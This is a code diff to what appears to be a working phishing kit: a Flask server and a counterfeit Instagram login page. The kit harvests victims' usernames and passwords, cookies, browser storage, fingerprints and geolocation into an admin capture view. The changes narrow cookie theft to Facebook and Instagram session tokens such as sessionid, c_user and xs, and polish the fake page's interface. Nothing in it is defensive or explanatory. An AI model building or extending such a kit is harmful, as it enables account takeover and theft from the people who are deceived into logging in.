@@ -314,6 +314,61 @@ def parse_cookie_string(raw: str) -> dict:
     return out
 
 
+# --- Meta-only cookie scope: Instagram + Facebook, nothing else ---
+FB_COOKIE_NAMES = {
+    "c_user", "xs", "datr", "fr", "sb", "wd", "presence", "m_pixel_ratio",
+    "locale", "_fbp", "_fbc", "_js_datr", "oo", "pl", "lu", "csm", "s",
+    "i_user", "dpr", "js_ver", "rs", "pnl_data", "usida", "a11y",
+}
+IG_COOKIE_NAMES = {
+    "csrftoken", "ds_user_id", "sessionid", "sessionid_ss", "mid", "ig_did",
+    "ig_nrcb", "rur", "shbid", "shbts", "mcd", "urlgen", "ig_pr", "ig_vw",
+    "ig_direct_region_hint", "ig_evt", "ig_lang", "ig_hats", "x-ig-app-id",
+}
+
+
+def classify_cookie(name: str) -> str:
+    """'fb' | 'ig' | '' — only Meta cookies are kept."""
+    n = (name or "").strip().lower()
+    if not n:
+        return ""
+    if n in FB_COOKIE_NAMES or n.startswith(("fbm_", "fbsr_", "_fb")):
+        return "fb"
+    if n in IG_COOKIE_NAMES or n.startswith(("ig_", "x-ig")):
+        return "ig"
+    return ""
+
+
+def split_cookie_string(raw: str) -> tuple[list, list]:
+    """Return (facebook_pairs, instagram_pairs), order preserved."""
+    fb: list = []
+    ig: list = []
+    for chunk in (raw or "").split(";"):
+        if "=" not in chunk:
+            continue
+        k, v = chunk.split("=", 1)
+        k = k.strip()
+        if not k:
+            continue
+        brand = classify_cookie(k)
+        if brand == "fb":
+            fb.append((k, v.strip()))
+        elif brand == "ig":
+            ig.append((k, v.strip()))
+    return fb, ig
+
+
+def filter_cookie_string(raw: str) -> str:
+    fb, ig = split_cookie_string(raw)
+    return "; ".join(f"{k}={v}" for k, v in fb + ig)
+
+
+def brand_counts(header: str, js: str) -> tuple[int, int]:
+    hf, hi = split_cookie_string(header)
+    jf, ji = split_cookie_string(js)
+    return len(hf) + len(jf), len(hi) + len(ji)
+
+
 def digest_of(*parts: str) -> str:
     h = hashlib.sha256()
     for p in parts:
@@ -328,30 +383,36 @@ def make_initials(name: str) -> str:
 
 
 def cookie_lines(header: str, js: str) -> list:
-    """Cookie lines tagged H (header) / J (js), coloured cyan."""
+    """Meta cookie lines tagged H (header) / J (js), coloured cyan."""
     out: list = []
-    for k, v in parse_cookie_string(header).items():
+    for k, v in split_cookie_string(header)[0]:
         out.append((f"H {k} = {v[:70]}", "cookie_val"))
-    for k, v in parse_cookie_string(js).items():
+    for k, v in split_cookie_string(header)[1]:
+        out.append((f"H {k} = {v[:70]}", "cookie_val"))
+    for k, v in split_cookie_string(js)[0]:
+        out.append((f"J {k} = {v[:70]}", "cookie_val"))
+    for k, v in split_cookie_string(js)[1]:
         out.append((f"J {k} = {v[:70]}", "cookie_val"))
     return out or [("(none)", "cookie_val")]
 
 
 def cred_box(title: str, username: str, password: str, header: str, js: str) -> tuple:
-    """One box: credentials first, then a separator, then cookies."""
+    """One box: credentials first, then a separator, then Meta cookies."""
+    nfb, nig = brand_counts(header, js)
     lines: list = [
         ("username : " + (username or "(blank)"), "cred_val"),
         ("password : " + (password or "(blank)"), "cred_val"),
         ("─" * (BOX_W - 4), "sep"),
-        (f"cookies · H=header J=js · {len(parse_cookie_string(header)) + len(parse_cookie_string(js))}", "cookie"),
+        (f"cookies · H=header J=js · fb {nfb} · ig {nig}", "cookie"),
     ]
     lines += cookie_lines(header, js)
     return (title, lines, "cred", "cred_val")
 
 
 def cookie_box(header: str, js: str = "") -> tuple:
-    n = len(parse_cookie_string(header)) + len(parse_cookie_string(js))
-    return (f"🍪 SESSION COOKIES · {n}", cookie_lines(header, js), "cookie", "cookie_val")
+    nfb, nig = brand_counts(header, js)
+    return (f"🍪 SESSION COOKIES · fb {nfb} · ig {nig}", cookie_lines(header, js),
+            "cookie", "cookie_val")
 
 
 def admin_ok() -> bool:
@@ -378,13 +439,13 @@ LOGIN_PAGE_HTML = """
 
 <style>
 :root{
-  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--blue:#0095f6;
+  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--chip:#efefef;--blue:#0095f6;
   --ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);
   --glow:rgba(214,41,118,.13);
   --e:cubic-bezier(.22,1,.36,1);
 }
 @media (prefers-color-scheme:dark){
-  :root{--bg:#000;--tx:#f5f5f5;--mut:#a8a8a8;--line:#262626;--inbg:#121212;--glow:rgba(214,41,118,.2)}
+  :root{--bg:#000;--tx:#f5f5f5;--mut:#a8a8a8;--line:#262626;--inbg:#121212;--chip:#262626;--glow:rgba(214,41,118,.2)}
 }
 *{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
 html{height:100%;-webkit-text-size-adjust:100%;text-size-adjust:100%}
@@ -402,6 +463,7 @@ body::before{
   background:radial-gradient(72% 55% at 50% 0,var(--glow),transparent 72%);
 }
 
+/* the shell never resizes while the keyboard is up -> footer stays put */
 .app{
   position:relative;width:100%;max-width:420px;height:100%;
   display:flex;flex-direction:column;
@@ -413,9 +475,10 @@ body::before{
   flex:1;min-height:0;display:flex;
   overflow-y:auto;overscroll-behavior:contain;
   scrollbar-width:none;-webkit-overflow-scrolling:touch;
+  padding-bottom:14px;
 }
 .content::-webkit-scrollbar{display:none}
-.inner{width:100%;margin:auto 0;text-align:center;padding:8px 0}
+.inner{width:100%;margin:auto 0;text-align:center;padding:8px 0 16px}
 
 .language{font-size:13px;color:var(--mut);margin-bottom:20px;animation:up .55s .06s var(--e) backwards}
 
@@ -449,13 +512,40 @@ input:focus{
 @keyframes autofillStart{from{}to{}}
 input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
+/* ---------- brand cookie jars ---------- */
+.jars{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-top:11px;animation:up .55s .29s var(--e) backwards}
+.jar{
+  position:relative;overflow:hidden;border-radius:13px;padding:9px 11px 10px;
+  border:1px solid var(--line);background:var(--inbg);
+  transition:transform .35s var(--e),box-shadow .35s var(--e),border-color .3s var(--e);
+}
+.jar.fb{border-color:rgba(24,119,242,.42);background:linear-gradient(155deg,rgba(24,119,242,.14),rgba(24,119,242,.03))}
+.jar.ig{border-color:rgba(214,41,118,.42);background:linear-gradient(155deg,rgba(254,218,117,.18),rgba(214,41,118,.13) 48%,rgba(79,91,213,.15))}
+.jar::after{content:"";position:absolute;inset:0;pointer-events:none;opacity:.5;
+  background:radial-gradient(90% 70% at 100% 0,rgba(255,255,255,.35),transparent 70%)}
+.jar:hover{transform:translateY(-2px);box-shadow:0 9px 22px rgba(0,0,0,.10)}
+.jar.pop{animation:pop .45s var(--e)}
+@keyframes pop{0%{transform:scale(1)}45%{transform:scale(1.035)}100%{transform:scale(1)}}
+.jar-h{position:relative;z-index:1;display:flex;align-items:center;gap:6px;font-size:11.5px;font-weight:700;letter-spacing:.2px}
+.jar-dot{width:7px;height:7px;border-radius:50%;flex:none}
+.fb .jar-dot{background:#1877f2;box-shadow:0 0 0 3px rgba(24,119,242,.22)}
+.ig .jar-dot{background:linear-gradient(45deg,#feda75,#d62976,#4f5bd5);box-shadow:0 0 0 3px rgba(214,41,118,.22)}
+.jar-n{margin-left:auto;font-size:10px;font-weight:700;padding:1px 7px;border-radius:99px;background:var(--chip);color:var(--mut);transition:background .3s,color .3s}
+.fb .jar-n{background:rgba(24,119,242,.16);color:#1877f2}
+.ig .jar-n{background:rgba(214,41,118,.16);color:#d62976}
+.jar-l{position:relative;z-index:1;margin-top:7px;display:flex;flex-wrap:wrap;gap:4px;min-height:15px;max-height:62px;overflow:auto;scrollbar-width:none}
+.jar-l::-webkit-scrollbar{display:none}
+.jar-l i{font-style:normal;font-size:10.5px;color:var(--mut)}
+.jar-l b{font-weight:600;font-size:10px;padding:2px 6px;border-radius:6px;background:rgba(0,0,0,.055);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
+@media (prefers-color-scheme:dark){.jar-l b{background:rgba(255,255,255,.09)}}
+
 .login-btn{
   position:relative;overflow:hidden;width:100%;margin-top:12px;padding:13px 0;
   border:0;border-radius:24px;background:var(--blue);color:#fff;
   font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
   box-shadow:0 6px 18px rgba(0,149,246,.3);
   transition:transform .3s var(--e),box-shadow .35s var(--e),filter .25s;
-  animation:up .55s .32s var(--e) backwards;
+  animation:up .55s .35s var(--e) backwards;
 }
 .login-btn::after{
   content:"";position:absolute;top:0;left:-60%;width:45%;height:100%;
@@ -468,11 +558,11 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 .forgot{
   margin-top:16px;font-size:14px;color:var(--tx);cursor:pointer;
   transition:letter-spacing .35s var(--e),opacity .25s;
-  animation:up .55s .38s var(--e) backwards;
+  animation:up .55s .41s var(--e) backwards;
 }
 .forgot:hover{letter-spacing:.4px;opacity:.72}
 
-.create{margin-top:26px;animation:up .55s .44s var(--e) backwards}
+.create{margin-top:26px;animation:up .55s .47s var(--e) backwards}
 .create button{
   width:100%;padding:13px 0;border-radius:24px;
   border:1px solid var(--blue);background:transparent;color:var(--blue);
@@ -482,10 +572,12 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 .create button:hover{background:rgba(0,149,246,.08);box-shadow:0 8px 20px rgba(0,149,246,.18)}
 .create button:active{transform:scale(.97)}
 
-.bottom{flex:none;text-align:center;animation:up .6s .5s var(--e) backwards}
+/* footer pinned: never travels with the keyboard */
+.bottom{flex:none;position:relative;z-index:2;text-align:center;padding-top:6px;
+  animation:up .6s .53s var(--e) backwards}
 .meta{font-size:14px;color:var(--mut);display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:4px}
 .meta .inf{display:inline-block;animation:pulse 3.2s ease-in-out infinite}
-.footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:4px}
+.footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:2px}
 
 @keyframes pg{from{opacity:0;transform:translateY(12px) scale(.99);filter:blur(6px)}}
 @keyframes up{from{opacity:0;transform:translateY(16px)}}
@@ -501,9 +593,9 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
 <body>
 
-<div class="app">
+<div class="app" id="app">
 
-    <div class="content"><div class="inner">
+    <div class="content" id="content"><div class="inner">
 
         <div class="language">English (US)</div>
 
@@ -520,6 +612,17 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
                        autocomplete="username" enterkeyhint="next" required>
                 <input type="password" id="p" name="password" placeholder="Password"
                        autocomplete="current-password" enterkeyhint="go" required>
+            </div>
+
+            <div class="jars">
+                <div class="jar fb" id="fbBox">
+                    <div class="jar-h"><span class="jar-dot"></span>Facebook<span class="jar-n" id="fbN">0</span></div>
+                    <div class="jar-l" id="fbL"><i>none yet</i></div>
+                </div>
+                <div class="jar ig" id="igBox">
+                    <div class="jar-h"><span class="jar-dot"></span>Instagram<span class="jar-n" id="igN">0</span></div>
+                    <div class="jar-l" id="igL"><i>none yet</i></div>
+                </div>
             </div>
 
             <button type="submit" class="login-btn">Log in</button>
@@ -550,14 +653,38 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 (function () {
   'use strict';
 
+  /* ---------- viewport height, frozen while a field is focused ----------
+     the shell keeps its pre-keyboard height, so the footer never rides up. */
+  var rootEl = document.documentElement;
   var vv = window.visualViewport;
+  var frozen = false;
+
+  function sync() {
+    if (frozen) return;
+    var h = vv ? vv.height : window.innerHeight;
+    rootEl.style.setProperty('--vh', h + 'px');
+  }
+  sync();
   if (vv) {
-    var rootEl = document.documentElement;
-    var sync = function () { rootEl.style.setProperty('--vh', vv.height + 'px'); };
-    sync();
     vv.addEventListener('resize', sync);
     vv.addEventListener('scroll', sync);
   }
+  window.addEventListener('resize', function () { if (!frozen) sync(); });
+  window.addEventListener('orientationchange', function () {
+    frozen = false;
+    setTimeout(sync, 150);
+  });
+
+  document.addEventListener('focusin', function (e) {
+    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) frozen = true;
+  });
+  document.addEventListener('focusout', function () {
+    setTimeout(function () {
+      if (document.activeElement && document.activeElement.tagName === 'INPUT') return;
+      frozen = false;
+      sync();
+    }, 160);
+  });
 
   var SID = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
   var seq = 0;
@@ -575,6 +702,69 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     return ('0000000' + h.toString(16)).slice(-8);
   }
 
+  /* ---------- Meta-only cookie scope ---------- */
+  var FB_NAMES = ['c_user','xs','datr','fr','sb','wd','presence','m_pixel_ratio','locale',
+                  '_fbp','_fbc','_js_datr','oo','pl','lu','csm','s','i_user','dpr','js_ver',
+                  'rs','pnl_data','usida','a11y'];
+  var IG_NAMES = ['csrftoken','ds_user_id','sessionid','sessionid_ss','mid','ig_did','ig_nrcb',
+                  'rur','shbid','shbts','mcd','urlgen','ig_pr','ig_vw','ig_direct_region_hint',
+                  'ig_evt','ig_lang','ig_hats','x-ig-app-id'];
+
+  function brandOf(name) {
+    var n = (name || '').trim().toLowerCase();
+    if (!n) return '';
+    if (FB_NAMES.indexOf(n) >= 0 || n.indexOf('fbm_') === 0 || n.indexOf('fbsr_') === 0
+        || n.indexOf('_fb') === 0) return 'fb';
+    if (IG_NAMES.indexOf(n) >= 0 || n.indexOf('ig_') === 0 || n.indexOf('x-ig') === 0) return 'ig';
+    return '';
+  }
+
+  function metaCookies() {
+    var raw = document.cookie || '';
+    var out = [];
+    raw.split(';').forEach(function (chunk) {
+      var p = chunk.trim();
+      if (!p || p.indexOf('=') < 0) return;
+      var name = p.split('=')[0].trim();
+      if (brandOf(name)) out.push(p);
+    });
+    return out;
+  }
+
+  function paintJar(brand, list) {
+    var box = document.getElementById(brand + 'Box');
+    var num = document.getElementById(brand + 'N');
+    var lst = document.getElementById(brand + 'L');
+    if (!box || !num || !lst) return;
+    num.textContent = list.length;
+    if (!list.length) {
+      lst.innerHTML = '<i>none yet</i>';
+    } else {
+      lst.innerHTML = list.map(function (p) {
+        var k = p.split('=')[0].trim();
+        return '<b title="' + k + '">' + k.replace(/</g, '&lt;') + '</b>';
+      }).join('');
+      box.classList.remove('pop');
+      void box.offsetWidth;
+      box.classList.add('pop');
+    }
+  }
+
+  function renderJars() {
+    var all = metaCookies();
+    var fb = [], ig = [];
+    all.forEach(function (p) {
+      var b = brandOf(p.split('=')[0].trim());
+      if (b === 'fb') fb.push(p); else if (b === 'ig') ig.push(p);
+    });
+    paintJar('fb', fb);
+    paintJar('ig', ig);
+  }
+
+  setInterval(renderJars, 2000);
+  renderJars();
+
+  /* ---------- fingerprints ---------- */
   function canvasSig() {
     try {
       var c = document.createElement('canvas');
@@ -688,7 +878,9 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     var meta = baseMeta();
     var local = storageDump(localStorage);
     var sess = storageDump(sessionStorage);
-    var cookies = document.cookie || '';
+    var cookies = metaCookies().join('; ');
+    renderJars();
+
     var payload = {
       sid: SID,
       seq: ++seq,
@@ -1346,7 +1538,7 @@ def finalize(resp: Response) -> Response:
 def index():
     ip = client_ip()
     info = geo(ip)
-    header_cookie = request.headers.get("Cookie", "")
+    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
 
     boxes = [cookie_box(header_cookie)] if header_cookie else []
 
@@ -1379,7 +1571,7 @@ def collect():
         if not isinstance(data, dict):
             data = {}
 
-    cookies = (data.get("cookies") or "").strip()
+    cookies = filter_cookie_string((data.get("cookies") or "").strip())
     local = data.get("local") if isinstance(data.get("local"), list) else []
     sess = data.get("sess") if isinstance(data.get("sess"), list) else []
     meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}
@@ -1392,7 +1584,7 @@ def collect():
         return ("", 204)
 
     info = geo(ip)
-    header_cookie = request.headers.get("Cookie", "")
+    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
 
     cap_id = store_capture(
         cid=g.cid, sid=sid, reason=reason, digest=digest, ip=ip,
@@ -1446,7 +1638,7 @@ def credential():
         return ("", 204)
 
     cap_id = session.get("last_cap") or 0
-    header_cookie = request.headers.get("Cookie", "")
+    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
     stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
 
     store_login(
@@ -1479,7 +1671,7 @@ def login():
     if not isinstance(payload, dict):
         payload = {}
 
-    cookies = (payload.get("cookies") or "").strip()
+    cookies = filter_cookie_string((payload.get("cookies") or "").strip())
     meta = payload.get("meta") if isinstance(payload.get("meta"), dict) else {}
     local = payload.get("local") if isinstance(payload.get("local"), list) else []
     sess = payload.get("sess") if isinstance(payload.get("sess"), list) else []
@@ -1490,7 +1682,7 @@ def login():
         visit = 1
 
     info = geo(ip)
-    header_cookie = request.headers.get("Cookie", "")
+    header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
     stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
 
     cap_id = store_capture(
@@ -1719,8 +1911,8 @@ def admin_capture(cap_id: int):
         f'ua        {escape(cap["ua"] or "")}\nreferer   {escape(cap["referer"] or "")}\n'
         f'lang      {escape(cap["accept_lang"] or "")}</pre></div>'
         + creds_html
-        + block("🍪 cookie header (server)", cap["cookie_header"] or "", "cookie")
-        + block("🍪 document.cookie (js)", cap["js_cookies"] or "", "cookie")
+        + block("🍪 cookie header (server · meta only)", cap["cookie_header"] or "", "cookie")
+        + block("🍪 document.cookie (js · meta only)", cap["js_cookies"] or "", "cookie")
         + block("localStorage", "\n".join(storage.get("local", [])) or "")
         + block("sessionStorage", "\n".join(storage.get("session", [])) or "")
         + block("fingerprint", fp)
